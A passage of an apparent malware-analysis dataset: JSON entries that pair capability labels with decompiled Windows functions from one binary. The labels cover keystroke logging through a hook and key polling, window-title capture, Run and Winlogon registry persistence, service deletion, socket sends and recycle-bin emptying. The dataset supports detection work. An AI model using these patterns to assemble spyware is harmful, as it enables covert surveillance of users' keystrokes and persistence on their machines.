        "decompiled_code": "\nvoid fcn.00431c64(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x431dc8);\n    if (iVar1 != 0) {\n        *0x497bf8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431dd8);\n        *0x497bfc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431dec);\n        *0x497bf0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e00);\n        *0x497bf4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e18);\n        *0x497bcc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e30);\n        if (*0x497bcc == 0) {\n            *0x497bcc = 0x408070;\n        }\n        *0x497bd0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e48);\n        if (*0x497bd0 == 0) {\n            *0x497bd0 = 0x4084d8;\n        }\n        *0x497bd4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e60);\n        if (*0x497bd4 == 0) {\n            *0x497bd4 = 0x408200;\n        }\n        *0x497bd8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e78);\n        if (*0x497bd8 == 0) {\n            *0x497bd8 = 0x4081f0;\n        }\n        *0x497bdc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e90);\n        if (*0x497bdc == 0) {\n            *0x497bdc = 0x4081f8;\n        }\n        *0x497be0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ea4);\n        if (*0x497be0 == 0) {\n            *0x497be0 = 0x408488;\n        }\n        *0x497be4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431eb8);\n        if (*0x497be4 == 0) {\n            *0x497be4 = 0x408480;\n        }\n        *0x497be8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ed0);\n        if (*0x497be8 == 0) {\n            *0x497be8 = 0x408490;\n        }\n    }\n    return;\n}\n",
        "token_count": 615
    },
    "00447cc4": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00447cc4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x447ce8);\n    if (iVar1 != 0) {\n        *0x490504 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x447cf4);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d370": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d370(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < iVar1) {\n        param_1 = in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 87
    },
    "00407688": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.00407688(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x4957f4 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x48f7b8 * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x48f7b8);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00407644();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x48f7b8);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x4957fc;\n}\n",
        "token_count": 164
    },
    "0041c254": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c254(uint noname_0, uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c1b4(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c1b4(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.0041bda4();\n    return;\n}\n",
        "token_count": 207
    },
    "00421cd0": {
        "rules": [
            "delete registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.00421cd0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.advapi32.dll_RegDeleteValueA(*(in_EAX + 4), uVar1);\n    return uVar2 & 0xffffff00 | uVar2 == 0;\n}\n",
        "token_count": 94
    },
    "00480968": {
        "rules": [
            "log keystrokes"
        ],
        "decompiled_code": "\nuint fcn.00480968(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_MapVirtualKeyA();\n    if (iVar1 == 0x1a) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "0043bbc0": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint8_t fcn.0043bbc0(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43bbfc;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 170
    },
    "004697fc": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.004697fc(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.004695e8, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 50
    },
    "00469a28": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00469a28(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.00469824, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 50
    },
    "00469b4c": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00469b4c(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.00469a50, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 52
    },
    "00480f70": {
        "rules": [
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\nvoid fcn.00480f70(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x481087;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0, 0);\n    *0x4981b8 = sub.user32.dll_SetWindowsHookExA(0xd, fcn.00480980, uVar2);\n    fcn.00489414();\n    fcn.00405818();\n    cVar1 = fcn.0040a280();\n    if (cVar1 == '\\0') {\n        fcn.00489414();\n        fcn.00405818();\n        fcn.0040a2a4();\n    }\n    fcn.00489414();\n    fcn.0047fdd8(0x4810a0, 0);\n    fcn.004058e0();\n    fcn.00403770();\n    fcn.00480040();\n    fcn.00405584();\n    fcn.00480040();\n    fcn.00405584();\n    fcn.00480180();\n    fcn.00405584();\n    *in_FS_OFFSET = 0;\n    fcn.00405554(0x48108e);\n    return;\n}\n",
        "token_count": 391
    },
    "00480040": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.00480040(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4800ad;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c10();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x4800b4);\n    return;\n}\n",
        "token_count": 268
    },
    "0048b580": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048b580(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48b5ed;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c10();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x48b5f4);\n    return;\n}\n",
        "token_count": 271
    },
    "0048c638": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048c638(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48c6a5;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c10();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x48c6ac);\n    return;\n}\n",
        "token_count": 271
    },
    "0046ba1c": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nvoid fcn.0046ba1c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY68;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x46ba2e;\n    fcn.004059cc();\n    uStack28 = 0x46ba9b;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        uVar2 = fcn.004059dc(0x10000);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            sub.advapi32.dll_DeleteService(iVar3);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY68 = iVar1;\n    }\n    *in_FS_OFFSET = iStackY68;\n    fcn.00405530(0x46baa2);\n    return;\n}\n",
        "token_count": 308
    },
    "0048bd1c": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048bd1c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402f00();\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x90);\n    fcn.0040aa98();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 74
    },
    "0048bd4c": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048bd4c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402f00();\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1, 0x90);\n    fcn.0040aa98();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 74
    },
    "0046b0fc": {
        "rules": [
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid fcn.0046b0fc(void)\n\n{\n    fcn.00421644();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421fe8();\n    return;\n}\n",
        "token_count": 50
    },
    "0047e590": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e590(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405a3c(1, 0);\n    sub.wsock32.dll_send(*(arg_8h + -4), uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "0047f930": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047f930(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405a3c(1, 0);\n    sub.wsock32.dll_send(*(arg_8h + -4), uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "0048260c": {
        "rules": [
            "persist via Winlogon Helper DLL registry key"
        ],
        "decompiled_code": "\nvoid fcn.0048260c(void)\n\n{\n    uint32_t arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack32 = 0x4826cf;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    fcn.00421688();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421fe8();\n    arg_ch = *0x482730;\n    arg_8h = &var_8h;\n    fcn.0040f224();\n    fcn.00405864();\n    fcn.0040ef34(arg_8h, arg_ch);\n    fcn.004055c8();\n    fcn.00421f88();\n    fcn.00404650();\n    *in_FS_OFFSET = arg_8h;\n    iStack36 = 0x4826d6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 296
    },
    "00488ab4": {
        "rules": [
            "empty the recycle bin"
        ],
        "decompiled_code": "\nvoid fcn.00488ab4(void)\n\n{\n    sub.SHELL32.DLL_SHEmptyRecycleBinA(0, 0x488ac4, 1);\n    return;\n}\n",
        "token_count": 44
    }
}